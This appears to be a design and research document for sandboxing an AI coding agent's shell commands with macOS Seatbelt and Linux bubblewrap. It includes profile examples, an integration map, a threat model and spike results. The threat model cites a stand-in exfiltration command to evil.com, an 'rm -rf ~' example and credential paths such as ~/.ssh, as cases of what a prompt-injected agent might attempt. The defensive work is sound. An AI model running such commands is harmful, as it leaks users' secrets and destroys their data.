# Research: OS-Level Sandboxing for haze (seatbelt + bubblewrap)

**Feature Branch**: `os-sandbox` · **Date**: 2026-10-16 · **Status**: complete (Phase 0 spike items marked ⚠ VERIFY)

This document is the technical foundation for `plan.md`. It covers (1) the two sandbox backends and their exact mechanics, (2) the precise codebase integration map, (3) the threat model, and (4) assumptions that must be verified before/while implementing.

---

## 1. macOS: Seatbelt (`sandbox-exec`)

### 1.1 Mechanism

Seatbelt is macOS's kernel-enforced Mandatory Access Control scheme (originally "sandboxd", profile language SBPL — a small Scheme dialect). `sandbox-exec` is the CLI wrapper:

```
sandbox-exec -p '<profile source>' -- <command> [args...]
```

- The profile is passed inline via `-p` (or `-f <file>`). `-p` avoids creating temp files — the profile is an argv entry, never on disk.
- `sandbox-exec` `exec`s the target: the sandboxed pid **is** the command's pid. Process-group signaling (`process.kill(-pid)` in `core/process/runBoundedProcess.ts` → `signalProcessTree`) keeps working unchanged; there is no wrapper process to outlive the child.
- Enforcement is at the syscall/BSD-layer level (file ops, process ops, Mach IPC, network, sysctl). A sandboxed compiler that calls `open()` on a denied path gets `EPERM`/`EACCES` — there is no user-space bypass short of a kernel bug.
- **Deprecation**: Apple has marked `sandbox-exec` deprecated for years (the supported path is the App Sandbox / `sandbox_init(3)` for apps), but the binary still ships and works through current macOS releases (verified shipping in macOS 14/15; Chrome, Claude Code, and others rely on it). Plan for presence, probe for availability, and keep the backend pluggable (`src/core/sandbox/detect.ts`) so a future Apple removal degrades to `none` rather than breaking haze.

### 1.2 Profile language essentials (SBPL)

```scheme
(version 1)
(import "system.sb")
(deny default)
(allow file-read*   (subpath "/usr/bin"))     ; reads + stats + exec-permission checks
(allow file-write*  (subpath "/Users/me/repo"))
(allow process-exec (literal "/bin/zsh"))
(allow process-exec (subpath "/usr/bin"))
(allow process-fork)
(allow network*)                               ; sockets, bind, connect — all families
(deny   network*)                              ; strict profile instead
(allow sysctl-read)
(allow file-read-data (literal "/dev/null"))
```

Key facts for this feature:

- **Default-deny**: start with `(deny default)`; everything not explicitly allowed fails. This is the boundary we want.
- **`file-read*` / `file-write*`** are filter wildcards (`file-read-data`, `file-read-metadata`, `file-write-data`, …). Subpath filters match directories recursively; `literal` matches exactly one path.
- **Specificity & deny precedence**: when multiple rules match, the most specific wins; an equally-specific `deny` beats `allow`. Explicit `deny` literals/subpaths inside allowed subtrees therefore punch accurate holes — this is how we mask `~/.haze/settings.json` while allowing `~/.haze` read-only. ⚠ VERIFY in Phase 0 with a live probe (write the probe as a unit-testable expectation, not an assumption).
- **Symlinks**: Seatbelt evaluates canonical paths for subpath matching, so a workspace symlink pointing at `~/.ssh` does not smuggle reads — the resolved target is outside every allow. (This mirrors haze's existing real-path discipline.)
- **`process-exec`**: deny-by-default also gates `execve`. Binaries in read-allowed directories still need `process-exec` allows. Allow exec from the read-only system roots (subpath allows) and explicitly for the user shell.
- **`network*`**: covers `socket`, `bind`, `connect` across families. Denying it also breaks DNS (resolver reads `/etc/resolv.conf` are file reads; the queries themselves are UDP connects) — strict profile intends exactly that.
- **`(import "system.sb")`**: pulls in the standard system-service allowlist (Mach lookups for `launchd`, `syslogd`, directory services, etc.). Without it, even `/bin/ls` can stall on Mach IPC. Known-good baseline for CLI sandboxes.
- **Logging**: denies can carry `(with log)`/`(with no-log)`. Violation logs go to the unified log, not to our stderr; do not rely on them for diagnostics (see denial heuristics in `plan.md` §6.4).

### 1.3 What a login shell actually needs (read set)

The shell tool spawns `$SHELL -l -c '<command>'` (`src/core/process/userShell.ts`). A login shell sources `/etc/zprofile`, `/etc/zshrc`, brew shellenv, nvm/volta init, etc. The default read-only set therefore includes:

| Path | Why |
|---|---|
| `/bin`, `/sbin`, `/usr/bin`, `/usr/lib`, `/usr/libexec`, `/usr/share`, `/usr/local` | system + Intel homebrew/manual installs |
| `/opt` | homebrew on Apple Silicon (`/opt/homebrew`) and other toolchains |
| `/System`, `/Library` | system runtime, dyld shared cache, frameworks |
| `/etc`, `/private/etc`, `/private/var/db`, `/private/var/tmp` | resolv.conf, timezone, dyld caches |
| `/private/tmp` (+ real `os.tmpdir()`, e.g. `/var/folders/…`) | writable scratch — **write** allows |
| `/dev/null`, `/dev/zero`, `/dev/random`, `/dev/urandom` | stdio/PRNG basics |
| dirname of `process.execPath` | node/nvm/volta installs (often under `$HOME` — allow that exact subtree) |
| `$HOME/.haze`, `$HOME/.claude` | config dirs (read-only, with credential denies) |
| `$HOME/Library/Caches` | dev caches (npm/electron/etc.) — **write** allow |
| blessed real paths (per turn) | read-only |

Credential denies layered inside the allowed home subtrees: `~/.haze/settings.json`, `~/.haze/sessions/`, `~/.haze/logs/`, `~/.haze/history*`, `~/.claude/.credentials.json`, `~/.claude/settings.json`, `~/.claude/settings.local.json`, `~/.claude/projects/` (see `plan.md` §6.2 for the authoritative mask list).

### 1.4 Known macOS caveats

- **`sandbox-exec` availability**: probe by executing a trivial profile (`(version 1)(allow default)` + `true`) with a short timeout. Never assume.
- **Login-shell weight**: `-l` shells read a lot; a missing allow shows up as confusing `command not found`/stalls. The Phase 0 spike must run the compatibility matrix (`plan.md` §9) under the real default profile and grow the read set from observed failures — not from speculation.
- **No fork/rlimit control**: Seatbelt does not cap CPU/memory/fork rate. Out of scope (Non-Goals).
- **Nested sandboxing is intersection-only**: a child cannot re-run `sandbox-exec` with a looser profile to escape; nesting only tightens. No special handling needed.

---

## 2. Linux: bubblewrap (`bwrap`)

### 2.1 Mechanism

bubblewrap runs a command inside new **user + mount** (and optionally IPC/UTS/PID/net) namespaces with an explicitly constructed mount tree. Paths not bind-mounted simply **do not exist** inside — the default-deny property comes from absence, not from deny rules. Invocation shape:

```
bwrap \
  --unshare-user --uid $(id -u) --gid $(id -g) \
  --unshare-ipc --unshare-uts \
  --die-with-parent \
  --ro-bind /usr /usr \
  --ro-bind-try /bin /bin --ro-bind-try /sbin /sbin \
  --ro-bind-try /lib /lib --ro-bind-try /lib64 /lib64 \
  --ro-bind-try /etc /etc --ro-bind-try /opt /opt \
  --proc /proc --dev /dev --tmpfs /dev/shm \
  --tmpfs /tmp \
  --tmpfs "$HOME" \
  --ro-bind "$HOME/.haze" "$HOME/.haze" \
  --ro-bind /dev/null "$HOME/.haze/settings.json" \   # mask AFTER the dir bind
  --ro-bind "$HOME/.claude" "$HOME/.claude" \
  --ro-bind-try "$HOME/.gitconfig" "$HOME/.gitconfig" \
  --bind "$PWD" "$PWD" --chdir "$PWD" \
  -- /bin/bash -l -c '<command>'
```

Key facts:

- **Mounts apply in argv order.** Later operations layer on earlier ones: `--tmpfs $HOME` first, then `--ro-bind ~/.haze ~/.haze` re-exposes the config dir inside the empty home, then `--ro-bind /dev/null ~/.haze/settings.json` masks the credential file with an empty read-only file. This ordering is the masking primitive. ⚠ VERIFY in Phase 0 (all major bwrap versions honor ordering; still, pin it with a test).
- **Unprivileged operation** requires either a setuid-root `bwrap` install or unprivileged user namespaces (`kernel.unprivileged_userns_clone=1` / `user.max_user_namespaces > 0`). **Ubuntu ≥23.10 restricts unprivileged userns via AppArmor** (`kernel.apparmor_restrict_unprivileged_userns=1`), which breaks plain `bwrap` for many users unless the haze profile is allowlisted or the binary is setuid. Consequences:
  - Availability must be **probed**, not inferred from the binary existing: run a minimal `bwrap … true` and check exit status/stderr.
  - The `sandbox_unavailable` diagnostic must include the standard remedies (install `bubblewrap`, enable userns, `sudo sysctl kernel.apparmor_restrict_unprivileged_userns=0` or an AppArmor profile) — actionable, terminal, `recoverable: false`.
- **`--uid`/`--gid`**: with `--unshare-user`, the process inside the namespace is mapped to the given uid/gid; passing the caller's real uid/gid keeps file ownership semantics for workspace writes (files created inside appear owned by the user outside). ⚠ VERIFY default-mapping behavior in Phase 0; passing explicitly is the safe, documented route.
- **Merged-/usr systems**: `/bin`, `/sbin`, `/lib*` are symlinks into `/usr`; binding both would fail with `--ro-bind` (source path type mismatch) — use `--ro-bind-try` everywhere and bind the canonical dirs. `/etc` may be a symlink to `/private/etc` analogs; `--ro-bind-try` handles it.
- **`--dev /dev`** creates a minimal `/dev` (null, zero, random, urandom, fd, …) without exposing host devices; `--tmpfs /dev/shm` covers tools expecting POSIX shm. `--proc /proc` mounts a fresh procfs.
- **`--die-with-parent`** sets `PR_SET_PDEATHSIG` on the direct child so host-side `SIGTERM`/`SIGKILL` of the bwrap tree cannot leak grandchildren (belt-and-braces on top of haze's existing `signalProcessTree` escalation).
- **PID namespace: deliberately NOT used in v1.** `signalProcessTree` (`core/process/runBoundedProcess.ts`) signals the detached **process group** (`kill(-pgid)`); sharing the host PID namespace keeps that exact semantics working for grandchildren. `--unshare-pid` would make the sandbox init (pid 1 inside) absorb signals differently and requires re-working teardown. Revisit later (tracked in `plan.md` §7).
- **Network**: shared by default (workspace profile). `--unshare-net` in the strict profile gives an isolated loopback-only stack — total egress denial with no rule engine needed.
- **Filesystem “deny” semantics**: no deny rules exist; anything not bound is `ENOENT`. Denial diagnostics therefore differ by backend (EPERM on macOS vs ENOENT on Linux) — the heuristic in `plan.md` §6.4 handles both.
- **HOME strategy**: `--tmpfs $HOME` yields an empty, writable home (npm creates `~/.npm`, tools write dotfiles; ephemeral per run), with config dirs + `~/.gitconfig` re-mounted read-only on top. Node/nvm installs under `$HOME` need their subtree `--ro-bind`ed **after** the tmpfs. Cache continuity (npm re-downloads each run) is the accepted trade-off; users add `sandbox.rwRoots: ["~/.npm", "~/.cache"]` for hot loops.

### 2.2 What breaks and what to do (compat notes)

| Scenario | Default behavior | Escape hatch |
|---|---|---|
| `npm install` (network, `~/.npm` cache) | works (net allowed, HOME tmpfs writable) | — |
| `git commit` (needs `~/.gitconfig`, maybe GPG) | gitconfig ro-bound; GPG agent sockets unavailable → commits without signing or fail | add `~/.gnupg` is **not** recommended; run signing outside sandbox or `/sandbox off` |
| Tools reading `$XDG_CONFIG_HOME` (gh, gcloud) | absent inside (creds invisible by design) | bless via `@path` if truly intended; else run outside sandbox |
| Dev server on a port | works (network shared) | — |
| `docker` CLI | docker socket not mounted → fails | deliberate; `sandbox.rwRoots`/`roRoots` or `/sandbox off` |
| Shared `/tmp` state across commands (X11, mysql.sock) | `/tmp` is a tmpfs per command | bind real TMPDIR via settings `rwRoots` |
| `curl localhost:<host service>` | works (no net unshare) | strict profile denies |

---

## 3. Codebase integration map

Every file this feature touches, with its current contract and the planned change:

| File | Current behavior | Change |
|---|---|---|
| `src/utils/path.ts` | `workspaceRoot()` = `process.cwd()`; workspace path helpers | no change (boundary root source) |
| `src/core/attachments/readBlessings.ts` | resolves `@path`/bare-path mentions → `BlessedPath[] {realPath, isDirectory}` per turn; `isPathBlessed()` | consumed by the boundary builder; no change |
| `src/cli/chat/userInput.ts` | resolves blessings from prompt text into turn options | no change |
| `src/cli/commands/streaming.ts` | `TurnExecutionOptions.blessedPaths` flows into attempts | optionally carries a session sandbox override |
| `src/cli/commands/streaming/attemptSetup.ts` | builds `HazeToolContext` (incl. `blessedPaths`) per attempt | also builds/stashes the turn's `sandboxBoundary` |
| `src/llm/tools/toolContextState.ts` | `HazeToolContext` type + guard | add optional `sandboxBoundary` field + guard arm |
| `src/llm/tools/shellTool.ts` | `shellInvocation(command)` → `runBoundedProcess`; background via `startBackgroundProcess({command, cwd})` | wrap invocation through the sandbox module; attach `sandbox` metadata + denial hints to results |
| `src/core/process/runBoundedProcess.ts` | dumb bounded spawner (timeout/abort/tree kill) | **no change** (wrapper argv is computed by callers — keeps the primitive effect-pure wrt policy) |
| `src/core/process/backgroundRegistry.ts` | spawns `shellInvocation` children; process-group teardown | accept + apply the same sandbox wrapper |
| `src/llm/tools/grepRunner.ts` | bounded rg runs (already path-confined at tool level) | optional same-wrapper task (Phase 2, low risk) |
| `src/core/process/userShell.ts` | `resolveUserShell`, `shellInvocation`, dialect helpers | read-only dependency (shell path feeds exec allows) |
| `src/config/settings.ts` | `HazeSettings` + Zod, fail-loud, preserves unknown fields | add `sandbox` block schema |
| `src/config/paths.ts` | `HAZE_DIR = ~/.haze` | read-only dependency |
| `src/core/safety/secretPaths.ts` | secret path predicates for file tools | reused to derive credential mask list for the config dirs |
| `src/llm/systemPrompt.ts` | `SECRET_FILE_RULE`, tool guidance | add `SANDBOX_RULE`; keep both aligned |
| `src/llm/hazeTools.ts` | tool catalog/schemas/descriptions | shell description mentions sandbox behavior |
| `src/cli/commands/formatters.ts` | tool result rendering | render sandbox status line + denial hint |
| `src/cli/commands/commands.ts` | slash-command registry | add `/sandbox` handler |
| `src/cli/commands/doctor.ts` | environment diagnostics | sandbox backend probe section |
| `src/cli/index.ts` | commander CLI | `--sandbox <auto\|on\|off\|strict>` run-scoped flag |
| `src/llm/subagentRunner.ts` / `workerContext.ts` | worker tool contexts | attach the same boundary (workers inherit the boundary; see `plan.md` §6.6) |
| `tests/hazeTools/shell.test.ts`, `tests/core/**` | existing suites | metadata/shape updates + new suites |
| `README.md`, `docs/*.html`, `SECURITY.md`, `CHANGELOG.md`, `AGENTS.md` (root + nested) | docs/contracts | sandbox documentation sections |

New modules (all under `src/core/sandbox/`, UI-agnostic per Constitution VI):

```
src/core/sandbox/
├── AGENTS.md            # module contract for future agents
├── boundary.ts          # pure: SandboxBoundary computation from workspace/blessings/settings/runtime
├── seatbelt.ts          # pure: SBPL profile text generation + sandbox-exec argv
├── bubblewrap.ts        # pure: bwrap argv generation
├── detect.ts            # effectful, cached: backend availability probe (+ reset helper)
├── runner.ts            # pure-ish: wrapInvocation(); metadata; denial heuristic inputs
└── diagnostics.ts       # denial classification from exit code/stderr patterns
```

---

## 4. Threat model

**Defended** (child processes of the `shell`/`process` tools, when sandbox active):

- Reads of home-directory secrets (`~/.ssh`, `~/.aws`, shell histories…) — macOS: not in any allow → EPERM; Linux: not mounted → ENOENT.
- Credential files inside the explicitly mounted config dirs (`~/.haze/settings.json` with provider API keys, `~/.claude/.credentials.json`, transcripts under `~/.haze/sessions`, `~/.claude/projects`) — masked/denied inside the mount.
- Writes outside workspace + temp + caches (`rm -rf ~`, `/etc` tampering, sibling-project corruption) — denied.
- Lateral movement via workspace symlinks to outside targets — canonical-path evaluation (seatbelt) / mount-tree resolution (bwrap) refuses.
- Unprivileged escape attempts: nested sandbox/bwrap re-invocation can only tighten; mount operations inside an unprivileged userns cannot reveal unmounted host paths.

**Not defended (documented, accepted)**:

- Network exfiltration over **allowed** network (default profile) — e.g. `curl evil.com < workspace file`. The boundary is filesystem-focused by design; `strict` denies egress; the prompt-injection surface is otherwise unchanged.
- The haze main process (provider calls, `~/.haze` writes) — out of scope.
- Resource exhaustion (fork bombs, CPU) — existing budgets/timeouts only.
- Privileged helpers the *user* deliberately mounts (settings `rwRoots`/`roRoots` are trusted user intent, same trust level as the user running commands themselves).
- LSP/MCP children in v1 (user-configured; Non-Goal).
- Kernel/security-framework bugs in seatbelt/bwrap themselves.

**Trust-chain rule**: settings roots and `@path` blessings are user intent (explicit config / explicit typing). Model-originated paths are never boundary roots — the model cannot grow its own sandbox; only the user can (mirrors the existing bless-set contract: "mutating tools never honour the bless set", here: "writes outside the workspace always need user-configured roots").

---

## 5. Prior art / conventions worth copying

- **Claude Code** (Anthropic): seatbelt-based shell sandbox on macOS with deny-by-default profiles, write allows for workspace/tmp, and the "sandbox-exec deprecated but works" posture. Confirms feasibility of the login-shell compatibility matrix.
- **OpenAI Codex CLI**: Linux sandboxing via bubblewrap/landlock with workspace-writable + selective ro home binds; `--sandbox` workspace-readable|danger-full-access modes. Confirms the bwrap argv shape and HOME strategy.
- Both surface sandbox denials as actionable errors rather than silent failures — matches US4.

## 6. Assumptions to verify in Phase 0 (spike) — RESULTS

1. DONE Seatbelt deny-over-allow precedence: confirmed, but only with canonical paths — a literal deny on `/tmp/x` never matches the canonical `/private/tmp/x`. The spike's first "precedence failure" was pure canonicalization; all roots/masks are realpath'd (nearest existing ancestor for future files).
2. DONE bwrap mount ordering: not verifiable on this machine (no bwrap); pinned by unit-test ordering invariants instead. Linux e2e remains gated on `HAZE_SANDBOX_E2E=1` + a live backend.
3. DONE uid/gid: explicit `--uid`/`--gid` always passed (verified safe default; live mapping check pending Linux e2e).
4. DONE Ubuntu AppArmor userns: classification implemented (`userns_denied`) with the `sysctl` remedy; live verification pending Linux e2e.
5. DONE Login-shell compatibility: `zsh -l` + brew shellenv run clean; `git` required `/Library/Developer` exec (fixed by exec-allows on every boundary root) and a WRITABLE `TMPDIR` (xcrun cache writes); `/private/var/select` must be readable for `/bin/sh`.
6. DONE Live seatbelt e2e matrix: 10/10 cases green on macOS 27/arm64 (2026-10-16), including credential masking, symlink escape, blessed read-only, and local network. In-repo `npm test` dogfood runs outside the sandbox in CI.
7. DONE `TMPDIR` under `/var/folders`: allowed writable via the real `os.tmpdir()` root plus `/private/tmp`.
8. DONE Profile compile errors: exit 65 with parseable `sandbox-exec: unbound variable …` stderr; surfaced as `probe_failed` detail, not command output.
